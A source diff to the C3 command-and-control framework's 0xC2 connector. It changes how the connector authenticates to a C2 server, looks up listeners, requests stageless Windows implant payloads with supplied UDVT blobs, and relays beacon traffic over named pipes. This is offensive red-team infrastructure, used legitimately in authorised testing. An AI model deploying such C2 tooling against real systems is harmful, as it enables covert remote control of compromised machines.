@@ -90,11 +90,9 @@ namespace FSecure::C3::Interfaces::Connectors
 
 		/// Retrieves 0xC2Agent payload from 0xC2 using the API.
 		/// @param binderId address of beacon in network.
-		/// @param pipename name of pipe hosted by the SMB 0xC2Agent.
-		/// @param listenerId the id of the Bridge listener for 0xC2
 		/// @param isX64 whether to use 64 or x86 arch
 		/// @return generated payload.
-		FSecure::ByteVector GeneratePayload(ByteView binderId, std::string pipename, uint32_t connectAttempts, bool isX64);
+		FSecure::ByteVector GeneratePayload(ByteView binderId, bool isX64);
 
 		/// Close desired connection
 		/// @arguments arguments for command. connection Id in string form.
@@ -127,6 +125,19 @@ namespace FSecure::C3::Interfaces::Connectors
 
 		///0xC2 password
 		std::string m_password;
+
+		///0xC2 base64 encoded UDVT string
+		std::string m_udvt64;
+		std::string m_udvt32;
+
+		///0xC2 pipename encoded in the udvt
+		std::string m_pipename;
+
+		///0xC2 external listener name
+		std::string m_externalListenerName;
+
+		///0xC2 listener name
+		std::string m_listenerName;
 
 		///0xC2 profile
 		FSecure::json m_profile;
@@ -179,7 +190,7 @@ bool FSecure::C3::Interfaces::Connectors::OhxC2::UpdateListenerId()
 	bool retVal = false;
 	for (auto& listeners : response)
 	{
-		if (listeners[OBF("name")] == OBF("0xC2Bridge"))
+		if (listeners[OBF("name")] == m_listenerName)
 		{
 			this->m_ListenerId = listeners[OBF("listenerID")].get<int>();
 			auto prof = listeners[OBF("profile")];
@@ -189,7 +200,7 @@ bool FSecure::C3::Interfaces::Connectors::OhxC2::UpdateListenerId()
 			retVal = true;
 		}
 
-		if (listeners[OBF("name")] == OBF("TestC3"))
+		if (listeners[OBF("name")] == m_externalListenerName)
 		{
 			this->m_ListeningPostPort = listeners[OBF("port")].get<int>();;
 		}
@@ -205,7 +216,7 @@ FSecure::C3::Interfaces::Connectors::OhxC2::OhxC2(ByteView arguments)
 	json postData;
 	json response;
 
-	std::tie(m_ListeningPostPort, m_webHost, m_username, m_password) = arguments.Read<uint16_t, std::string, std::string, std::string>();
+	std::tie(m_externalListenerName, m_listenerName, m_webHost, m_username, m_password, m_udvt64, m_udvt32, m_pipename) = arguments.Read<std::string, std::string, std::string, std::string, std::string, std::string, std::string, std::string>();
 
 	// if the last character is '/' remove it
 	if (this->m_webHost.back() == '/')
@@ -243,55 +254,12 @@ FSecure::C3::Interfaces::Connectors::OhxC2::OhxC2(ByteView arguments)
 	this->m_token = response[OBF("access_token")].get<std::string>();
 
 	// TODO: If the listener doesn't already exist create it.
-	if (!UpdateListenerId())
+	if (UpdateListenerId())
 	{
-		//extract ip address from url
-		size_t start = 0, end = 0;
-		start = url.find("://") + 3;
-		end = url.find(":", start + 1);
-
-		if (start == std::string::npos || end == std::string::npos || end > url.size())
-			throw std::exception(OBF("[0xC2] Incorrect URL, must be of the form http|https://hostname|ip:port - eg https://192.168.133.171:7443"));
-
-		this->m_ListeningPostAddress = url.substr(start, end - start);
-
-		///Create the bridge listener
-		url = this->m_webHost + OBF("/vi/listener");
-
-		web::http::client::http_client webClientBridge(utility::conversions::to_string_t(url), config);
-		request = web::http::http_request(web::http::methods::POST);
-		request.headers().set_content_type(utility::conversions::to_string_t(OBF("application/json")));
-
-		std::string authHeader = OBF("Bearer ") + this->m_token;
-		request.headers().add(OBF(L"Authorization"), utility::conversions::to_string_t(authHeader));
-
-		//The data to create a bridge listener
-		// TODO: Fix for 0xc2
-		json postData;
-		postData[OBF("name")] = OBF("C3Bridge");
-		postData[OBF("guid")] = OBF("b85ea642f2");
-		postData[OBF("description")] = OBF("A bridge for custom listeners");
-		postData[OBF("bindAddress")] = OBF("0.0.0.0");
-		postData[OBF("bindPort")] = this->m_ListeningPostPort;
-		postData[OBF("connectAddresses")] = { this->m_ListeningPostAddress };
-		postData[OBF("connectPort")] = this->m_ListeningPostPort;
-		postData[OBF("status")] = OBF("Active");
-		postData[OBF("listenerTypeId")] = 2;
-		postData[OBF("profileId")] = 3;
-
-		request.set_body(utility::conversions::to_string_t(postData.dump()));
-
-		task = webClientBridge.request(request);
-		resp = task.get();
-
-		if (resp.status_code() != web::http::status_codes::OK)
-			throw std::exception((OBF("[0xC2] Error setting up BridgeListener, HTTP resp: ") + std::to_string(resp.status_code())).c_str());
-
-		if (!UpdateListenerId()) //now get the id of the listener
-			throw std::exception((OBF("[0xC2] Error getting ListenerID after creation")));
+		InitializeSockets();
 	}
-
-	InitializeSockets();
+	else
+		throw std::exception((OBF("[0xC2] Error getting listener information.")));
 }
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 FSecure::C3::Interfaces::Connectors::OhxC2::~OhxC2()
@@ -332,9 +300,9 @@ bool FSecure::C3::Interfaces::Connectors::OhxC2::DeinitializeSockets()
 }
 
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::GeneratePayload(ByteView binderId, std::string pipename, uint32_t connectAttempts, bool arch64)
+FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::GeneratePayload(ByteView binderId, bool arch64)
 {
-	if (binderId.empty() || pipename.empty())
+	if (binderId.empty())
 		throw std::runtime_error{ OBF("Wrong parameters, cannot create payload") };
 
 	std::string authHeader = OBF("Bearer ") + this->m_token;
@@ -345,14 +313,15 @@ FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::GeneratePayload(
 	web::http::client::http_client webClient(utility::conversions::to_string_t(this->m_webHost + OBF("/v1/payload/windows/stageless")), config);
 	web::http::http_request request;
 
-	
-	this->m_profile[OBF("p2p")][OBF("binding")] = "\\\\.\\pipe\\" + pipename;
 	//The data to create an 0xC2 payload
 	json postData;
-	postData[OBF("p2p")] = true;
+	postData[OBF("p2p")] = false;
 	postData[OBF("listenerID")] = this->m_ListenerId;
 	postData[OBF("arch")] = arch64 ? OBF("x64") : OBF("x86");
 	postData[OBF("profile")] = this->m_profile;
+	if (!arch64 && m_udvt32.empty())
+		throw std::runtime_error{ OBF("No 32-bit UDVT supplied for 32bit agent") };
+	postData[OBF("udvt")] = arch64 ? m_udvt64 : m_udvt32; 
 
 	try
 	{
@@ -422,12 +391,18 @@ const char* FSecure::C3::Interfaces::Connectors::OhxC2::GetCapability()
 		"arguments":
 		[
 			{
-				"type": "uint16",
-				"name": "0xC2BridgePort",
-				"min": 2,
-				"defaultValue": 8080,
-				"randomize": true,
-				"description": "The port for the C2Bridge Listener if it doesn't already exist."
+				"type": "string",
+				"name": "0xC2 External Listener Name",
+				"min": 1,
+				"defaultValue": "ExternalC3",
+				"description": "The name of the EXTERNAL listener within 0xC2."
+			},
+			{
+				"type": "string",
+				"name": "0xC2 Listener Name",
+				"min": 1,
+				"defaultValue": "C3",
+				"description": "The name of the standard listener within 0xC2."
 			},
 			{
 				"type": "string",
@@ -440,6 +415,7 @@ const char* FSecure::C3::Interfaces::Connectors::OhxC2::GetCapability()
 				"type": "string",
 				"name": "Username",
 				"min": 1,
+				"default": "extc3",
 				"description": "Username to authenticate"
 			},
 			{
@@ -447,6 +423,25 @@ const char* FSecure::C3::Interfaces::Connectors::OhxC2::GetCapability()
 				"name": "Password",
 				"min": 1,
 				"description": "Password to authenticate"
+			},
+			{
+				"type": "string",
+				"name": "UDVT64",
+				"min": 1,
+				"description": "Base64 encoded UDVT to force C3 communication."
+			},
+			{
+				"type": "string",
+				"name": "UDVT86",
+				"min": 0,
+				"description": "Base64 encoded UDVT to force C3 communication (not mandatory)."
+			},
+			{
+				"type": "string",
+				"name": "Pipename",
+				"default": "test",
+				"min": 4,
+				"description": "Pipename compiled in the UDVT"
 			}
 		]
 	},
@@ -568,7 +563,8 @@ void FSecure::C3::Interfaces::Connectors::OhxC2::Connection::StartUpdatingInSepa
 					if (auto packet = Receive(); !packet.empty())
 					{
 						// Don't forward NoOps over C3
-						if (packet.size() == 1u && packet[0] == 0u)
+						// TODO is this safe enough?
+						if (packet.size() == 60u)
 						{
 							if (!m_RecvQueue.empty())
 							{
@@ -576,14 +572,13 @@ void FSecure::C3::Interfaces::Connectors::OhxC2::Connection::StartUpdatingInSepa
 								auto msg = std::move(m_RecvQueue.front());
 								m_RecvQueue.pop_front();
 								Send(msg);
-							}
+							}				
+
 						}
 						else
 						{
 							// Send valid Commands over C3
 							bridge->PostCommandToBinder(m_Id, packet);
-							// Send NoOp on response to all commands.
-							//Send("\0"_bv);
 						}
 					}
 				}
@@ -602,8 +597,8 @@ bool FSecure::C3::Interfaces::Connectors::OhxC2::Connection::SecondThreadStarted
 
 FSecure::ByteVector FSecure::C3::Interfaces::Connectors::OhxC2::PeripheralCreationCommand(ByteView connectionId, ByteView data, bool isX64)
 {
-	auto [pipeName, maxConnectionAttempts, delayBetweenConnectionTrials, useSyscalls] = data.Read<std::string, uint16_t, uint16_t, bool>();
-	return ByteVector{}.Write(pipeName, maxConnectionAttempts, delayBetweenConnectionTrials, useSyscalls, GeneratePayload(connectionId, pipeName, maxConnectionAttempts, isX64));
+	auto [maxConnectionAttempts, delayBetweenConnectionTrials, useSyscalls] = data.Read<uint16_t, uint16_t, bool>();
+	return ByteVector{}.Write(m_pipename, maxConnectionAttempts, delayBetweenConnectionTrials, useSyscalls, GeneratePayload(connectionId, isX64));
 }
 
 
